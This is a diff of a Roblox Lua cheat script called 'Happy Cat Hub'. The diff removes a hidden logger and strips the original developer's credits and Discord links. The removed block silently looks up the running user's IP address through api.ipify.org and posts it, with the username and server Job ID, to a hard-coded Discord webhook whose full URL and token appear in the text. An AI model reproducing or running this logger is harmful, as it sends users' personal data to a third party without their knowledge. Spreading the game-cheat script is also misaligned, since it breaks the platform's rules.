@@ -1,63 +1,4 @@
-game.StarterGui:SetCore("SendNotification", {
-    Icon = "rbxassetid://104450799419041",
-    Title = "Happy Cat Hub",
-    Text = "Loading!",
-    Duration = 2,
-})
-------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------
-function PostWebhook(Url, message)
-    local request = http_request or request or HttpPost or syn.request
-    local data =
-        request(
-        {
-            Url = Url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = game:GetService("HttpService"):JSONEncode(message)
-        }
-    )
-    return ""
-end
-
-function AdminLoggerMsg()
-    local randomColor = math.random(0, 0xFFFFFF)
-    local AdminMessage = {
-        ["embeds"] = {
-            {
-                ["title"] = "**Update 0.02 part1**",
-                ["description"] = "",
-                ["type"] = "rich",
-                ["color"] = randomColor,
-                ["fields"] = {
-                    {
-                        ["name"] = "**Username**",
-                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "**IP Address**",
-                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**Job ID**",
-                        ["value"] = "```" .. game.JobId .. "```",
-                        ["inline"] = false
-                    }
-                }, 
-                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
-            }
-        }
-    }
-    return AdminMessage
-end
-
-
-PostWebhook(
-    "https://discord.com/api/webhooks/1282294193200566356/H_zjzIYdiMyQbDRwDKOTZkDuRp4v9IMTLJ8wyjUdwlED-tRX4QfAdmkTgy-ApRMSE_Aj",
-    AdminLoggerMsg()
-)
+print("load di pls")
 if game.PlaceId == 2753915549 then
     World1 = true
 elseif game.PlaceId == 4442272183 then
@@ -9952,41 +9893,10 @@ spawn(function()
     end)
 end)
 
-Tabs.support:AddButton({
-        Title = "Server Discord",
-        Description = "click for copy link and join",
-        Callback = function()            
-        setclipboard("https://discord.gg/VHb3D7sfqd") 
-      end
-    })
-    Tabs.support:AddSection("Updated Logs") 
-    Tabs.support:AddParagraph({
-        Title = "Updated: Smart Tween",
-        Content = "experience you will know"
-    })
-    Tabs.support:AddParagraph({
-        Title = "Updated: Mode Farming",
-        Content = "mode farm faster better"
-    })
-    Tabs.support:AddSection("Fixed Logs") 
-    Tabs.support:AddParagraph({
-        Title = "Fixed: Cake Prince",
-        Content = "fixed are not attacking cake prince"
-    })
-    Tabs.support:AddParagraph({
-        Title = "Fixed: Fast Attack",
-        Content = "Fixed slow and not attack mob if AFK long time"
-    })
-    Tabs.support:AddParagraph({
-        Title = "Fixed: Lag Script",
-        Content = "Fixed drop fps laggy, now is smooth in future I will try to optimize"
-    })
 
-print("load xong r") 
-print("Developer: baobg contact Facebook: lộc zutaki or discord: baobg")
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 game.StarterGui:SetCore("SendNotification", {
-Title = "HappyCathub",
+Title = "!",
 Text = "Successfully",
 Duration = 5,
 })
